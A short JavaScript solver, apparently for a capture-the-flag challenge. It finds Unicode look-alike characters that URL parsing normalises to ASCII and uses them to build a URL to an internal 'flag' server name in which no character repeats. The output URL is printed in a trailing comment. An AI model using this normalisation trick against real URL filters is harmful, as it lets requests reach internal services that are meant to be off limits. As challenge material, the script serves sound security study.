const findDomainAltChar = c => {
	const ar = []
	const target = new URL(`http://peko.${c}.com/`).hostname
	for (let i = 1; i < 65536; i++) {
		const cc = String.fromCharCode(i)
		try {
			if (new URL(`http://peko.${cc}.com/`).hostname == target) {
				ar.push(cc)
			}
		} catch (e) {}
	}
	return ar
}
const domain = 'the.c0o0o0l-fl444g.server.internal'
const alts = [...domain].map(findDomainAltChar)
const findUnique = (cur, alts) => {
	if (alts.length == 0) return cur
	const alt = alts[0]
	for (const c of alt) {
		const u = `htTp:${cur + c}`
		if (u.length === new Set(u).size) {
			const r = findUnique(cur + c, alts.slice(1))
			if (r) {
				return r
			}
		}
	}
}
const dd = findUnique('', alts)
console.log(`htTp:${dd}/`)

// htTp:ᵀHE.C0O⁰o₀L-Fl4⁴₄G。SeRVᴱr．INᵗᵉʳnAˡ/
